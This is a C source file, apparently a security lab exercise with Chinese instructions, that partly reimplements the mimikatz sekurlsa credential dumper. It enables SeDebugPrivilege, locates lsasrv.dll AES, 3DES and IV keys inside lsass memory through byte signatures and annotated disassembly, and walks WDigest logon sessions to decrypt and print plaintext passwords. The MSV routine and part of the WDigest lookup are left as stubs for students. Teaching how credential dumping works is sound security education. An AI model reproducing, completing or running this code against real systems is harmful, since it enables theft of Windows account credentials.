#include "mimikatz.h"
#include <stdio.h>

extern BYTE g_sekurlsa_IV[AES_128_KEY_LENGTH];
extern BYTE g_sekurlsa_AESKey[AES_128_KEY_LENGTH];
extern BYTE g_sekurlsa_3DESKey[DES_3DES_KEY_LENGTH];
extern HANDLE g_hLsass;

/*****************************************************
 *  请将以下函数填写完整，并实现对应的功能              *
 *    - EnableSeDebugPrivilege                       *
 *****************************************************/
 /// 推荐使用API: OpenProcessToken() LookupPrivilegeValueW() AdjustTokenPrivileges()
BOOL EnableSeDebugPrivilege() {
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	// 打开当前进程的访问令牌
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))return FALSE;
	// 获取 SeDebugPrivilege 的 LUID
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return FALSE;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	// 调整进程令牌中的权限
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
		CloseHandle(hToken);
		return FALSE;
	}
	// 检查是否成功启用了权限
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		CloseHandle(hToken);
		return FALSE;
	}
	CloseHandle(hToken);
	return TRUE;
}


/*****************************************************
 *  请将以下的三个函数填写完整，并实现对应的功能         *
 *    - LocateUnprotectLsassMemoryKeys               *
 *	  - GetCredentialsFromMSV                        *
 *	  - GetCredentialsFromWdigest                    *
 *****************************************************/

 /// 从 lsass.exe 内存中读取出后续对凭据进行AES解密或是3DES解密使用的密钥
 /// 设置相应的全局变量 g_sekurlsa_IV g_sekurlsa_AESKey g_sekurlsa_3DESKey
 /// 推荐API: SearchPattern() ReadFromLsass()
VOID LocateUnprotectLsassMemoryKeys() {
	DWORD aesOffset = 0, desOffset = 0, ivOffset = 0;
	DWORD aesSigOffset = 0, desSigOffset = 0, ivSigOffset = 0;
	KIWI_BCRYPT_HANDLE_KEY hAesKey, hDesKey;
	KIWI_BCRYPT_KEY81 extractedAesKey, extracted3DesKey;
	PVOID keyPointer = NULL;

	PUCHAR lsasrvBaseAddress = (PUCHAR)LoadLibraryA("lsasrv.dll");
	// 将lsass.exe所加载的模块lsasrv.dll加载入当前进程的内存空间中
	// 其所加载的基地址 lsasrvBaseAddress 与 lsass.exe 进程中 lsasrv.dll 模块的基地址是相同的
	// （同一个DLL模块在不同进程中会被加载到同一地址， ALSR 随机化不影响此行为）
	// lsasrv.dll 模块中的全局变量 hAesKey 是一个指向实际AES密钥的结构体指针
	// 接下来定位hAesKey在lsass.exe进程中的地址

	// 签名（Windows 10/11 测试可用）
	UCHAR keyAESSig[] = { 0x83, 0x64, 0x24, 0x30, 0x00,
						0x48, 0x8d, 0x45, 0xe0,
						0x44, 0x8b, 0x4d, 0xd8,
						0x48, 0x8d, 0x15 };
	UCHAR keyDESSig[] = { 0x83, 0x64, 0x24, 0x30, 0x00,
						0x48, 0x8d, 0x45, 0xe0,//48  8D 45 E0
						0x44, 0x8b, 0x4d, 0xd4,//44 8B 4D D4
						0x48, 0x8d, 0x15 };
	UCHAR keyIVSig[] = { 0x44, 0x8d, 0x4e, 0xf2, //44 8D 4E F2
						0x44, 0x8b, 0xc6, // 44 8B C6
						0x48, 0x8d, 0x15 };
	// lsasrv.dll 中 keyAESSig 字节序列所对应的指令反汇编，其中 99 2C 10 00 (小端数 0x102c99)
	// 为全局变量 hAesKey 所在地址相对下一条指令地址0x1800752BF的偏移
	// 故 hAesKey 结构体所在的地址为 0x1800752BF + 0x102c99 = 0x180177F58
	// .text:00000001800752AB 83 64 24 30 00          and     [rsp+70h+var_40], 0
	// .text:00000001800752B0 48 8D 45 E0             lea     rax, [rbp + pbBuffer]
	// .text:00000001800752B4 44 8B 4D D8             mov     r9d, dword ptr[rbp + var_28]; cbKeyObject
	// .text:00000001800752B8 48 8D 15 99 2C 10 00    lea     rdx, ? hAesKey; phKey
	// 
	// .text:00000001800752BF 48 8B 0D 9A 2C 10 00    mov     rcx, cs:?hAesProvider ; hAlgorithm
	//       ^^^^^^^^^^^^^^^^ 注释中出现的绝对地址 0x1800752BF 等以 win11的lsasrv.dll 为例，下同
	// .text:0000000180083EB5                 call    cs:__imp_BCryptGenRandom
	/*	.text:0000000180083EBC                 nop     dword ptr[rax + rax + 00h]
		.text : 0000000180083EC1                 mov     ebx, eax
		.text : 0000000180083EC3                 test    eax, eax
		.text : 0000000180083EC5                 js      loc_180083E09
		.text : 0000000180083ECB and [rsp + 70h + var_40], 0
		.text : 0000000180083ED0                 lea     rax, [rbp + pbBuffer]
		.text : 0000000180083ED4                 mov     r9d, dword ptr[rbp + var_28]; cbKeyObject
		.text:0000000180083ED8                 lea     rdx, ? hAesKey@@3PEAXEA; phKey
		.text:0000000180083EDF                 mov     rcx, cs : ? hAesProvider@@3PEAXEA; hAlgorithm
		.text:0000000180083EE6                 mov     r8, rdi; pbKeyObject
		.text:0000000180083EE9                 mov[rsp + 70h + cbSecret], esi; cbSecret
		.text:0000000180083EED                 mov[rsp + 70h + pcbResult], rax; pbSecret
		.text:0000000180083EF2                 call    cs : __imp_BCryptGenerateSymmetricKey
	*/

	// 在lsass进程的内存中搜索定位全局变量hAesKey的内存位置
	// 获取首条指令 and [rsp+70h+var_40], 0 相对lsasrv.dll模块基址的偏移
	aesSigOffset = SearchPattern(lsasrvBaseAddress, keyAESSig, sizeof keyAESSig);
	desSigOffset = SearchPattern(lsasrvBaseAddress, keyDESSig, sizeof keyDESSig);
	ivSigOffset = SearchPattern(lsasrvBaseAddress, keyIVSig, sizeof keyIVSig);
	wprintf(L"aesSigOffset = 0x%x\ndesSigOffset = 0x%x\nivSigOffset = 0x%x\n", aesSigOffset,desSigOffset,ivSigOffset);	// 0x752AB (00000001800752AB & 0xFFFFF)
	if (aesSigOffset != 0) {
		// 从lsass进程的内存位置lsasrvBaseAddress + keySigOffset + sizeof keyAESSig 上读取4字节的偏移
		//                     0x180000000       + 0x752AB      + 16              = 0x1800752bb
		// *(DWORD *)(0x1800752bb) = 0x102c99
		ReadFromLsass(lsasrvBaseAddress + aesSigOffset + sizeof keyAESSig, &aesOffset, sizeof aesOffset);
		wprintf(L"aesOffset = 0x%x\n", aesOffset);	// 0x102c99

		//			0x1800752bb↘
		//				48 8D 15 99 2C 10 00    lea     rdx, ? hAesKey; phKey
		// 0x1800752B8↗         ^^ ^^ ^^ ^^
		// 从lsass进程的内存位置lsasrvBaseAddress + keySigOffset + sizeof keyAESSig + 4 + aesOffset 上读取8字节的数据
		//                     0x180000000       + 0x752AB      + 16              + 4 + 0x102c99  = 0x180177f58
		//
		// .data:0000000180177F58 ?? ?? ?? ?? ?? ?? ?? ?? ?hAesKey@@3PEAXEA dq ?
		// 所读取的8字节的数据是一个指向结构体 KIWI_BCRYPT_HANDLE_KEY 的指针

		ReadFromLsass(lsasrvBaseAddress + aesSigOffset + sizeof keyAESSig + 4 + aesOffset, &keyPointer, sizeof keyPointer);
		wprintf(L"aesPointer = 0x%p\n", keyPointer); // 形如 0x000002318B910230

		// 从lsass进程的内存位置 keyPointer 读取出结构体的实际内容
		ReadFromLsass(keyPointer, &hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

		// 读取 KIWI_BCRYPT_HANDLE_KEY 结构体中
		// 类型为 PKIWI_BCRYPT_KEY81 的成员变量指针所指向的 KIWI_BCRYPT_KEY81 结构体
		// AES DES 密钥均使用 KIWI_BCRYPT_KEY81 结构体包裹
		ReadFromLsass(hAesKey.key, &extractedAesKey, sizeof(KIWI_BCRYPT_KEY81));

		// KIWI_BCRYPT_KEY81 中 hardkey.data包含密钥字节内容， hardkey.cbSecret包含密钥的长度
		memcpy(g_sekurlsa_AESKey, extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);

		wprintf(L"AES Key Located (len %d): ", extractedAesKey.hardkey.cbSecret);
		HexdumpBytesPacked(extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);
	}
	if (desSigOffset != 0) {
		ReadFromLsass(lsasrvBaseAddress + desSigOffset + sizeof keyDESSig, &desOffset, sizeof desOffset);
		ReadFromLsass(lsasrvBaseAddress + desSigOffset + sizeof keyDESSig + 4 + desOffset, &keyPointer, sizeof keyPointer);
		wprintf(L"desOffset = 0x%x\ndesPointer = 0x%p\n", desOffset, keyPointer);
		ReadFromLsass(keyPointer, &hDesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));
		ReadFromLsass(hDesKey.key, &extracted3DesKey, sizeof(KIWI_BCRYPT_KEY81));

		memcpy(g_sekurlsa_3DESKey, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
		wprintf(L"DES Key Located (len %d): ", extracted3DesKey.hardkey.cbSecret);
		HexdumpBytesPacked(extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);// 回显罢了
	}
	if (ivSigOffset != 0) {
		BYTE initializationVector[16] = { 1 };
		ReadFromLsass(lsasrvBaseAddress + ivSigOffset + sizeof keyIVSig, &ivOffset, sizeof ivOffset);
		ReadFromLsass(lsasrvBaseAddress + ivSigOffset + sizeof keyIVSig + 4 + ivOffset, g_sekurlsa_IV, sizeof g_sekurlsa_IV);
		//ReadFromLsass(ivPointer, initializationVector, sizeof(initializationVector));
		wprintf(L"IV Located (len %d): ", AES_128_KEY_LENGTH);
		HexdumpBytesPacked(g_sekurlsa_IV, AES_128_KEY_LENGTH);
	}
}

/// 导出Wdigest缓存在内存中的明文密码
VOID GetCredentialsFromWdigest() {
	KIWI_WDIGEST_LIST_ENTRY entry;
	DWORD logSessListSigOffset, logSessListOffset;
	PKIWI_WDIGEST_LIST_ENTRY logSessListAddr = NULL, pList;
	WCHAR passDecrypted[1024];

	PUCHAR wdigestBaseAddress = (PUCHAR)LoadLibraryA("wdigest.dll");

	/// ... 请修改

	ReadFromLsass(logSessListAddr, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));
	pList = entry.This;

	do {
		memset(&entry, 0, sizeof(entry));
		ReadFromLsass(pList, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));

		if (entry.UsageCount == 1) {
			UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(
				(PUCHAR)pList + offsetof(KIWI_WDIGEST_LIST_ENTRY, UserName)
				));
			UNICODE_STRING* password = ExtractUnicodeString((PUNICODE_STRING)(
				(PUCHAR)pList + offsetof(KIWI_WDIGEST_LIST_ENTRY, Password)
				));

			if (username != NULL && username->Length != 0) wprintf(L"Username: %ls\n", username->Buffer);
			else wprintf(L"Username: [NULL]\n");

			// Check if password is present
			if (password->Length != 0 && (password->Length % 2) == 0) {
				// Decrypt password using recovered AES/3Des keys and IV
				if (DecryptCredentials((char*)password->Buffer, password->MaximumLength,
					(PUCHAR)passDecrypted, sizeof(passDecrypted)) > 0) {
					wprintf(L"Password: %ls\n\n", passDecrypted);
				}
			}
			else {
				printf("Password: [NULL]\n\n");
			}

		}
		pList = entry.Flink;
	} while (pList != logSessListAddr);
	return;
}

/// 推荐使用API: 
///		LoadLibraryA() 
///		SearchPattern() 
///		ReadFromLsass() 
///		DecryptCredentials() 
///		ExtractUnicodeString()
/// 推荐使用结构体: 
///		KIWI_MSV1_0_LIST_63
///		KIWI_MSV1_0_CREDENTIALS 
///		KIWI_MSV1_0_PRIMARY_CREDENTIALS
VOID GetCredentialsFromMSV() {
	DWORD logSessListSigOffset, LogonSessionListOffset;
	PKIWI_MSV1_0_LIST_63 logSessListAddr = NULL;	// List Header

	/// ... 请修改

	PKIWI_MSV1_0_LIST_63 pList = logSessListAddr;

	do {
		KIWI_MSV1_0_LIST_63 listEntry;
		KIWI_MSV1_0_CREDENTIALS credentials;

		/// ... 请修改

	} while (pList != logSessListAddr);
}